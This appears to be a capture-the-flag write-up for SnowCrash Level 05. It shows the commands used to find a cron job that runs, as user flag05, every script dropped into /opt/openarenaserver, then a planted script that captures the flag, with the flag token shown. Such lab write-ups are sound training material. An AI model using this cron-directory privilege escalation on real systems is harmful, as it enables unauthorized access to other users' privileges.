# SnowCrash Level 05

## Introduction
Welcome to SnowCrash Level 05! In this level, we encountered challenges related to file ownership, cron jobs, and script execution.

## Initial Exploration
We initiated our investigation by searching for all files owned by flag05 using the command:
```bash
find / -user flag05 2> /dev/null
```
This command yielded:
```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Additionally, we found a file named level05 using the command:
```
find / -iname level05 2> /dev/null
```
Among other files, we discovered /var/mail/level05, which turned out to be a cron file containing:
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

```

## Examination of openarenaserver

Upon examining the contents of /usr/sbin/openarenaserver, we found:
```
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```
This script executes all scripts in /opt/openarenaserver and then erases them.
## Crafting the Exploit

To exploit this setup, we created a bash script in the /opt/openarenaserver directory to execute getflag and write the output to /var/tmp/test.txt.
Obtaining the Flag
```
#!/bin/bash

getflag > /var/tmp/test.txt
```

Upon execution of our script, we obtained the flag:
```
level05@SnowCrash:~$ cat /var/tmp/test.txt
Check flag. Here is your token: viuaaale9huek52boumoomioc
```
